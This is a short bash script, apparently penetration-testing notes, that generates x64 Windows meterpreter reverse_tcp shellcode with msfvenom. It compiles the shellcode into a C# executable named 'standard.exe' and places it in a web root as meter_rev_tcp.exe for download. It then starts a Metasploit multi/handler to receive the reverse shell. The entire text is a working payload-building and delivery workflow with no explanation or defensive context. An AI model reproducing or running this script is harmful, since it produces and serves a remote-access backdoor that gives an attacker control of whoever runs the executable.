## simple payload - x64
cd /usr/share/metasploit-framework
LHOST=192.168.1.242
DATE=`date +%Y-%m-%d`
LPORT=4444
results=("./msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f csharp > shellcode.cs")
eval $results

line=14;  sed -e "${line}r  shellcode.cs" template.cs > template1.cs  # compile
mcs -out:standard.exe template1.cs
file standard.exe
sudo mv standard.exe /var/www/html/meter_rev_tcp.exe

cat >msf.rc <<EOL
use multi/handler
set payload windows/meterpreter/reverse_tcp
setg LHOST ${LHOST}
set LPORT ${LPORT}
exploit -j -z
EOL

./msfconsole -r msf.rc
rm msf.rc
cd -
